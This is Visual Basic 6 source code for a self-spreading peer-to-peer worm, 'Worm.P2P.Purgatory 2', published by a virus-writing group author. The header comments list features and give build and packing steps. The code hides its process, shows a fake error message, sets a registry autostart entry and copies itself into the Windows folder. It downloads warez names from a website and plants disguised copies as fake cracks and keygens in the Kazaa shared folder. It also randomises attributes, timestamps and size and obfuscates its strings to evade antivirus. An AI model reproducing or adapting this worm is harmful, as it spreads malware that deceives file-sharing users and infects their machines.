   VERSION 5.00
   Begin VB.Form frmPurgatory
      BorderStyle     =   0  'Kein
      Caption         =   "Worm.Purgatory by DiA[rRlf]"
      ClientHeight    =   3195
      ClientLeft      =   0
      ClientTop       =   0
      ClientWidth     =   4680
      Icon            =   "frmPurgatory.frx":0000
      LinkTopic       =   "Form1"
      ScaleHeight     =   3195
      ScaleWidth      =   4680
      ShowInTaskbar   =   0   'False
      StartUpPosition =   3  'Windows-Standard
      Visible         =   0   'False
   End
   Attribute VB_Name = "frmPurgatory"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = False
   'Worm.P2P.Purgatory 2 by DiA[rRlf]
   'http://www.vx-dia.de.vu - DiA_hates_machine@gmx.de
   '--------------------------------------------------------------------
   '
   ':[welcome to Purgatory 2
   ' All comments between "[" and "]" are additional comments to Purgatory 1.
   ' Purgatory 1 will be released in rRlf #5, stay tuned.]
   '
   '
   ':intro
   ' Welcome to a new kind of P2P worm. I know that much lame P2P worms are
   ' exist. P2P spreading as one is lame, and very simple to do. But a idea comes to
   ' my mind how to make this lame spreading method a little bit better.
   ' So I resulute to write this little thing...and yes, in VB =)
   '
   '
   ':main-feature
   ' This creature get the fake names for the worm from the internet. There are
   ' many Warez/Keyz sites on the internet, with a huge list of newest software,
   ' and there will be updated every day/week. My "victim" site for this worm is
   ' ht*p://www.serialheaven.com/, becauze simple structure of the lists (.html)
   ' , easy to read the fake names, and huge lists. The lists stored in
   ' ht*p://www.serialheaven.com/namelist/a.html (0-9, a-z .html). This worm download
   ' one of this lists randomly, and read out the fake names. Sometimes there are only
   ' 20 fake names, and sometimes about 1200 fake names.
   '
   '
   ':all-features
   ' - downloading fake names
   ' - random appendix to the fake file name:
   '   o  "" (nothing)
   '   o  "_Crack"
   '   o  "_Serial"
   '   o  "_Keygen"
   ' - hiding worm process (register as system process)
   ' - autostart with registry
   ' - drop a copy in windows folder: Purga.exe
   ' - download fake name list in windows folder: PurgaList.DiA
   ' - if no connection to internet, drop 10 copys of worm in kazaa shared folder
   ' - random attributes of worms
   '   o  Normal
   '   o  System
   '   o  Hidden
   ' - random date/time of files (from 01.01.1999 00:00:00 to 31.12.2004 24:59:59)
   ' - simple silent worm, no payload
   ' - [random size, from 0 byte appendix to 2304 bytes]
   ' - [simple encrypted strings]
   '
   ':make a executable for Purgatory 2
   ' - compile it with Visual Basic 6 Compiler
   ' - remove all file properties with "ResourceHacker" (thx to Falckon for his tut)
   ' - pack it with upx: UPX Purgatory.exe
   ' - filesize now: 13824 bytes (size of Purgatory 1: 12288 bytes)
   '
   '
   ':[the cleaner
   ' I have written a little Worm-Cleaner for Purgatory. You can download it on my
   ' website: www.vx-dia.de.vu You simply have to run the Cleaner, press "clean"
   ' button and all is done. Now you only have to remove Purgatory copys from
   ' KazaA Shared Folder.
   '
   '
   ':outro
   ' Thats all about this, VB source is easy to understand, so take a look at the
   ' source if you want to understand how this bitch works. Any comments, greetz,
   ' fucks, ... please mail to DiA_hates_machine@gmx.de
   ' Check out my website http://www.vx-dia.de.vu
   '                                                      17.08.2004 - DiA[rRlf]
   '-------------------------------------------------------------------------------



   'to get the handle
   Private Declare Function GetCurrentProcessId Lib "kernel32" () As Long

   'to register the process as system process, and hide it from task manager
   Private Declare Function RegisterServiceProcess Lib "kernel32" (ByVal dwProcessId As Long, ByVal dwType As Long) As Long

   'to download a file from http protocol
   Private Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" (ByVal Zero1 As Long, ByVal URL As String, ByVal SaveTo As String, ByVal Zero2 As Long, ByVal Zero3 As Long) As Long

   'to stop the program some seconds
   Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)

   'to write a random file date/time ... with apis
   Private Type FileTime
       dwLowDateTime As Long
       dwHighDateTime As Long
   End Type

   Private Type SYSTEMTIME
       wYear As Integer
       wMonth As Integer
       wDayOfWeek As Integer
       wDay As Integer
       wHour As Integer
       wMinute As Integer
       wSecond As Integer
       wMilliSeconds As Integer
   End Type

   Private Declare Function CreateFile Lib "kernel32" Alias "CreateFileA" (ByVal lpFilename As String, ByVal dwDesiredAccess As Long, ByVal dwShareMode As Long, ByVal lpSecurityAttributes As Long, ByVal dwCreationDisposition As Long, ByVal dwFlagsAndAttributes As Long, ByVal hTemplateFile As Long) As Long

   Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long

   Private Declare Function SetFileTime Lib "kernel32" (ByVal hFile As Long, lpCreationTime As FileTime, lpLastAccessTime As FileTime, lpLastWriteTime As FileTime) As Long

   Private Declare Function FileTimeToLocalFileTime Lib "kernel32" (lpFileTime As FileTime, lpLocalFileTime As FileTime) As Long

   Private Declare Function FileTimeToSystemTime Lib "kernel32" (lpFileTime As FileTime, lpSystemTime As SYSTEMTIME) As Long

   Private Declare Function SystemTimeToFileTime Lib "kernel32" (lpSystemTime As SYSTEMTIME, lpFileTime As FileTime) As Long

   Private Declare Function LocalFileTimeToFileTime Lib "kernel32" (lpLocalFileTime As FileTime, lpFileTime As FileTime) As Long


   Private Sub Form_Load()
   On Error Resume Next

   Dim fso As Object
   Dim CurrentPath As String
   Dim Purgatory As String
   Dim WindowsPath As String
   Dim ws As Object
   Dim KazaaSharedFolder As String
   Dim NumOrChar As Integer
   Dim RanFile As String
   Dim FileToDownload As String
   Dim startPos As Long
   Dim endPos As Long
   Dim FakeName As String
   Dim FileString As String
   Dim StaticName(9) As String
   Dim NameNumber As Integer
   Dim DiAPurgatory As String


       'hide purgatory process from task manager
       RegisterServiceProcess GetCurrentProcessId, 1
       '-------------------------------------------------------------

       'for avers..
       DiAPurgatory = DecryptString("d| z;]?];]‚ tn*| †-p|qrq-o†-QvNh _ysj-5p6?==A-Tr zn{†")
       '-------------------------------------------------------------

       'get current path and filename
       If Right(App.Path, 1) <> DecryptString("i") Then
           CurrentPath = App.Path & DecryptString("i")
       Else
           CurrentPath = App.Path
       End If

       Purgatory = App.EXEName & DecryptString(";r…r")
       '-------------------------------------------------------------

       'get windows directory and if current is not win, show a fake error
       WindowsPath = Environ(DecryptString("dv{Qv ")) & DecryptString("i")

       If CurrentPath <> WindowsPath Then
           MsgBox DecryptString("Sn*ny-r  | -=@=??==A-|{-") & Purgatory & vbCrLf & _
                  DecryptString("Vs-†|‚-q|„{y|nqrq-*uv€-n}}yvpn*v|{9-}yrn€r-q|-v*-ntnv{;") _
                  , vbCritical, DecryptString("Sn*ny-R  | ")
       End If
       '-------------------------------------------------------------

       'check if copy of purgatory already in windows folder exist
       Set fso = CreateObject(DecryptString("`p v}*v{t;Svyr`†€*rz\owrp*"))

       If fso.FileExists(WindowsPath & DecryptString("]‚ tn;r…r")) = False Then
           FileCopy CurrentPath & Purgatory, WindowsPath & DecryptString("]‚ tn;r…r") 'copy to windows folder
       End If
       '-------------------------------------------------------------

       'write to the registry, to startup with every system start
       RegWrite DecryptString("UXRflY\PNYlZNPUV[Ri`|s*„n riZvp |€|s*idv{q|„€iP‚  r{*cr €v|{i_‚{i]‚ tn*| †"), WindowsPath & DecryptString("]‚ tn;r…r")
       '-------------------------------------------------------------

       'read kazaa shared folder from the registry
       KazaaSharedFolder = RegRead(DecryptString("UXRflPb__R[alb`R_i`|s*„n riXn‡nnia n{€sr iQyQv =")) & DecryptString("i")

       If KazaaSharedFolder = DecryptString("QvNh _ysji") Then End 'no kazaa, no worm
       '-------------------------------------------------------------

       'sleep some seconds before do the work
       Sleep 15000 '15 sek
       '-------------------------------------------------------------

       'create a random filename to download
       NumOrChar = RandomNumber(0, 1) 'random 0-9, or a-z

       If NumOrChar = 0 Then
           RanFile = Chr(RandomNumber(48, 57)) '0-9
       Else
           RanFile = Chr(RandomNumber(97, 122)) 'a-z
       End If

       FileToDownload = DecryptString("u**}G<<„„„;€r vnyurnƒr{;p|z<{nzryv€*<") & RanFile & DecryptString(";u*zy")
       '-------------------------------------------------------------

       'download a file from serialheaven and save in windows folder
       DLresult = URLDownloadToFile(0, FileToDownload, WindowsPath & DecryptString("]‚ tnYv€*;QvN"), 0, 0)

       If DLresult <> 0 Then GoTo StaticNames 'error

   DLComplete:
       If fso.FileExists(WindowsPath & DecryptString("]‚ tnYv€*;QvN")) = False Then GoTo DLComplete
       '-------------------------------------------------------------

       'find Fakenames in this file, and copy worm to this fakename in kazaa shared folder
       Open WindowsPath & DecryptString("]‚ tnYv€*;QvN") For Binary As #1
       FileString = Space(LOF(1))
       Get #1, , FileString
       Close #1

       Do
           startPos = InStr(startPos + 1, FileString, DecryptString("46/K"), vbTextCompare)
           If startPos > 0 Then
               endPos = InStr(startPos + 4, FileString, DecryptString("I<nK"))

               If endPos > 0 Then

                   FakeName = Mid$(FileString, startPos + 4, endPos - startPos - 4)
                   FakeName = CreateString(FakeName)
                   CopyPurgatory CurrentPath & Purgatory, KazaaSharedFolder & FakeName

               End If

           End If

       Loop Until startPos = 0
       GoTo TheEnd
       '-------------------------------------------------------------

       'cant get names via download, so get my own names..
   StaticNames:
       StaticName(0) = CreateString(DecryptString("cv€‚ny-On€vp-C"))
       StaticName(1) = CreateString(DecryptString("Zvp |€|s*-\ssvpr-?===-] rzv‚z-Sv{ny"))
       StaticName(2) = CreateString(DecryptString("Zvp |€|s*-dv{q|„€-FE-`rp|{q-Rqv*v|{-S‚yy-_r*nvy"))
       StaticName(3) = CreateString(DecryptString("S:`rp‚ r-N{*vcv ‚€-B;@"))
       StaticName(4) = CreateString(DecryptString("Syn€us…}-c?;=-O‚vyq-F=>"))
       StaticName(5) = CreateString(DecryptString("Syn€uTr*-Z‚y*vyn{t‚ntr->;>"))
       StaticName(6) = CreateString(DecryptString("cv *‚ny-]P-?==A"))
       StaticName(7) = CreateString(DecryptString("_Nc-N{*vƒv ‚€-Qr€x*|}-E;=;BC;?F"))
       StaticName(8) = CreateString(DecryptString("dv{q|„€-e]-] |-P| }| n*r-Sv{ny"))
       StaticName(9) = CreateString(DecryptString("dv{_N_-?;B=-QvN"))
       NameNumber = 0

       For i = 1 To 10 'do it in a other way the Purgatory.A
           CopyPurgatory CurrentPath & Purgatory, KazaaSharedFolder & StaticName(NameNumber)
           AddTrash KazaaSharedFolder & StaticName(NameNumber)
           RandomDateTime KazaaSharedFolder & StaticName(NameNumber)
           NameNumber = NameNumber + 1
       Next i
       'simplest fuckin way for p2p spreading...who cares suckz
       '-------------------------------------------------------------

       'end off all
   TheEnd:
       End
       '-------------------------------------------------------------
   End Sub



   Function RegWrite(ByVal Path As String, ByVal Value As String) As Boolean
       'to write to the registry
       Set ws = CreateObject(DecryptString("d`p v}*;`uryy"))
       ws.RegWrite Path, Value, DecryptString("_RTl`g")
       '-------------------------------------------------------------
   End Function



   Function RegRead(Path As String) As String
       'to read from the registry
       On Error GoTo NoKazaa
       Set ws = CreateObject(DecryptString("d`p v}*;`uryy"))
       RegRead = ws.RegRead(Path)
       Exit Function

   NoKazaa:
       RegRead = DecryptString("QvNh _ysj")
       '-------------------------------------------------------------
   End Function



   Function RandomNumber(ByVal min, ByVal max)
       'to get a random number between min and max
       Randomize
       RandomNumber = Int(min + (max - min + 1) * Rnd)
       '-------------------------------------------------------------
   End Function



   Function CreateString(ByVal FakeFileName As String)
       'to generate a random string: FakeFileName_Crack/Keygen/Serial/ /
       Dim RanType(3) As String
       Dim RandomType As Integer

       RanType(0) = ""
       RanType(1) = DecryptString("l`r vny")
       RanType(2) = DecryptString("lXr†tr{")
       RanType(3) = DecryptString("lP npx")

       RandomType = RandomNumber(0, 3)

       CreateString = FakeFileName & RanType(RandomType) & DecryptString(";r…r")
       '-------------------------------------------------------------
   End Function



   Function CopyPurgatory(ByVal Source As String, ByVal Target As String)
       'copy worm to fakefilenames with random attributes, normal, hidden, system...
       Dim RanAttr(2) As Integer
       Dim RandomAttr As Integer

       RanAttr(0) = vbNormal
       RanAttr(1) = vbHidden
       RanAttr(2) = vbSystem

       RandomAttr = RandomNumber(0, 2)

       FileCopy Source, Target

       AddTrash Target

       RandomDateTime Target

       SetAttr Target, RanAttr(RandomAttr)
       '-------------------------------------------------------------
   End Function



   Function WriteFileTime(ByVal lpFilename As String, ByVal tCreation As Date, ByVal tLastAccess As Date, ByVal tLastWrite As Date) As Boolean
       'to set the filetime to a copy of worm
       Dim fHandle As Long

       Dim ftCreation As FileTime
       Dim ftLastAccess As FileTime
       Dim ftLastWrite As FileTime
       Dim LocalFileTime As FileTime
       Dim LocalSystemTime As SYSTEMTIME

       WriteFileTime = False
       fHandle = CreateFile(lpFilename, &H40000000, 0, 0, 3, 0, 0)
       If fHandle <> 0 Then

           With LocalSystemTime
               .wDay = Day(tCreation)
               .wDayOfWeek = Weekday(tCreation)
               .wMonth = Month(tCreation)
               .wYear = Year(tCreation)
               .wHour = Hour(tCreation)
               .wMinute = Minute(tCreation)
               .wSecond = Second(tCreation)
           End With
           SystemTimeToFileTime LocalSystemTime, LocalFileTime
           LocalFileTimeToFileTime LocalFileTime, ftCreation

           With LocalSystemTime
               .wDay = Day(tLastAccess)
               .wDayOfWeek = Weekday(tLastAccess)
               .wMonth = Month(tLastAccess)
               .wYear = Year(tLastAccess)
               .wHour = Hour(tLastAccess)
               .wMinute = Minute(tLastAccess)
               .wSecond = Second(tLastAccess)
           End With
           SystemTimeToFileTime LocalSystemTime, LocalFileTime
           LocalFileTimeToFileTime LocalFileTime, ftLastAccess

           With LocalSystemTime
               .wDay = Day(tLastWrite)
               .wDayOfWeek = Weekday(tLastWrite)
               .wMonth = Month(tLastWrite)
               .wYear = Year(tLastWrite)
               .wHour = Hour(tLastWrite)
               .wMinute = Minute(tLastWrite)
               .wSecond = Second(tLastWrite)
           End With
           SystemTimeToFileTime LocalSystemTime, LocalFileTime
           LocalFileTimeToFileTime LocalFileTime, ftLastWrite

           If SetFileTime(fHandle, ftCreation, ftLastAccess, ftLastWrite) <> 0 Then
               WriteFileTime = True
           End If
           CloseHandle fHandle
       End If
       '-------------------------------------------------------------
   End Function



   Function RandomTime() As String
       'to create a random time
       Dim RanHour As String
       Dim RanMin As String
       Dim RanSek As String

       RanHour = RandomNumber(0, 24)
       If RanHour < 10 Then
           RanHour = "0" & RanHour
       End If

       RanMin = RandomNumber(0, 59)
       If RanMin < 10 Then
           RanMin = "0" & RanMin
       End If

       RanSek = RandomNumber(0, 59)
       If RanSek < 10 Then
           RanSek = "0" & RanSek
       End If

       RandomTime = RanHour & ":" & RanMin & ":" & RanSek
       '-------------------------------------------------------------
   End Function



   Function RandomDate() As String
       'to get a random date
       Dim RanDay As String
       Dim RanMonth As String
       Dim RanYear As String

       RanDay = RandomNumber(1, 31)
       If RanDay < 10 Then
           RanDay = "0" & RanDay
       End If

       RanMonth = RandomNumber(1, 12)
       If RanMonth < 10 Then
           RanMonth = "0" & RanMonth
       End If

       RanYear = RandomNumber(1999, 2004)

       RandomDate = RanDay & "." & RanMonth & "." & RanYear
       '-------------------------------------------------------------
   End Function



   Function RandomDateTime(ByVal WormCopy As String)
       'set the random date/time to the file
       Dim DCreation As Date
       Dim DLastAccess As Date
       Dim DLastWrite As Date

       DCreation = CDate(RandomDate & " " & RandomTime)
       DLastAccess = CDate(RandomDate & " " & RandomTime)
       DLastWrite = CDate(RandomDate & " " & RandomTime)

       WriteFileTime WormCopy, DCreation, DLastAccess, DLastWrite
       '-------------------------------------------------------------
   End Function



   Function DecryptString(DecryptThis As String) As String
       Dim Length As Integer
       Dim Decrypted As String

       Length = Len(DecryptThis)

       For i = 1 To Length
           Decrypted = Decrypted & Chr(Asc(Mid(DecryptThis, i, 1)) - 13)
       Next i

       DecryptString = Decrypted
   End Function



   Function Trash() As String
       Dim TrashLength As Integer

       TrashLength = RandomNumber(0, 2304)

       For i = 1 To TrashLength
           Trash = Trash & Chr(RandomNumber(48, 122))
       Next i
   End Function



   Function AddTrash(TrashName As String)
       Dim OrgFile As String

       Open TrashName For Binary Access Read As #1
       OrgFile = Space(13824)
       Get #1, , OrgFile
       Close #1

       Open TrashName For Binary Access Write As #1
       Put #1, , OrgFile
       Put #1, , Trash
       Close #1
   End Function
